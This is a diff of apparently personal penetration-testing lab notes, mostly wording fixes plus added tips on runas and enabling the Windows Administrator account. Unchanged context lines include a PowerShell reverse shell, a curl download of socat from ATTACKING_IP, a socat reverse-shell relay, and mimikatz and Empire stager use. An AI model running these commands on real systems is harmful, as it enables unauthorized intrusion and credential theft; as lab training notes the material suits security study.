@@ -337,7 +337,7 @@ _I was having trouble because i wasn't using the correct files_
 
 1. Updated link to binaries on github
 
-- Lets try re-uploading the tool.
+2. Lets try re-uploading the tool.
 
 And we get the nmap results back:
 
@@ -418,7 +418,7 @@ This brings me to a login page with default username and passwords exposed:
 
 ![[Pasted image 20240720063909.png]]
 
-I try the pass but it fails. Maybe i can do something with burp:
+I try the pass but it fails. Maybe i can do something with burp.
 
 ![[Pasted image 20240720064017.png]]
 
@@ -447,7 +447,7 @@ This  can also be done manually with `sed` if `dos2unix` is unavailable:
 sed -i 's/\r//' ./EDBID.py
 ```
 
-The script is written in python 2 so i add the correct shebang line to the top of the exploit:
+The script is written in python 2 so i add the correct `shebang` line to the top of the exploit:
 `#!/usr/bin/python2`
 
 **Details:**
@@ -465,7 +465,7 @@ Now if everything worked we should be able to use that information in burpsuite 
 
 - Change `GET` request to `POST`
 - Add `Content-Type` header
-- Add in the command executed with a as the parameter
+- Add in what command to be executed with `a` as the parameter
 
 ```php
 Content-Type: application/x-www-form-urlencoded
@@ -495,9 +495,11 @@ ping -n 3 ATTACKING_IP
 
 ![[Pasted image 20240721055757.png]]
 
-_Don't forget to URL encode if you have issues with burp_
+_Don't forget to URL encode if you have issues with burp._
 
 ![[Pasted image 20240721055911.png]]
+
+The pings are all timed out indicating it's on a subnet. 
 
 I have two easy options here:
 
@@ -541,7 +543,7 @@ powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.57.
 Linux prod-serv 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-Binary folder locaton:
+Binary folder locations:
 1. `/opt/static-binaries/`
 2. `/usr/share/windows-binaries`
 
@@ -562,7 +564,7 @@ curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
 
 **SOCAT Reverse Shell Relay**
 
-In this scenario we are using **socat** to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). 
+In this scenario we are using **socat** to create a relay for us to send a reverse shell back to our own attacking machine. 
 1. First let's start a standard netcat listener on our attacking box (`sudo nc -lvnp 443`). 
 2. Next, on the compromised server, use the following command to start the relay:  
 `./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`
@@ -647,10 +649,42 @@ So i'll upload mimikatz with evil-winrm.
 
 ![[Pasted image 20240721080138.png]]
 
+---
+
 - I'll try connecting with freerdp and using mimikatz because it wont run from evil-winrm, or i'm using it wrong
 
+- Looking this up further, i could try running evil-winrm as admin:
+
+All you have to do is use the `runas` command to run your program as Administrator (with a caveat).
+
+```
+runas /user:Administrator "cmdName parameters"
+```
+
+In my case, this was
+
+```
+runas /user:Administrator "cmd.exe /C %CD%\installer.cmd %CD%"
+```
+
+Note that you must use Quotation marks, else the runas command will gobble up the switch option to cmd.
+
+**Caveat: Enable the admin account**
+
+Using runas this way requires the administrative account to be enabled, which is not the default on Windows 7 or Vista. However, [here](http://www.petri.co.il/enable-the-windows-7-administrator-account.htm "petri.co.il") is a great tutorial on how to enable it, in three different ways:
+
+I myself enabled it by opening _Administrative Tools_, _Local Security Policy_, then navigating to _Local Policies\Security Options_ and changing the value of the _Accounts: Administrative Account Status_ policy to Enabled, which is none of the three ways shown in the link.
+
+An even easier way to accomplish this:
+
+```
+C:> net user Administrator /active:yes
+```
+
+---
+
 ```php
-xfreerdp /v:<IP>/u:<USER> /p:'password123!'
+xfreerdp /v:<IP> /u:<USER> /p:'password123!'
 ```
 
 ```php
@@ -787,6 +821,7 @@ starkiller
 - This brings us back to the stagers main menu where we are given the option to copy the stager to the clipboard by clicking on the "Actions" dropdown and selecting "Copy to Clipboard"
 - Now i can execute it on the target
 
+**_The stager, firewall rule, and php listener, should all be using the same port!_**
 
 
 
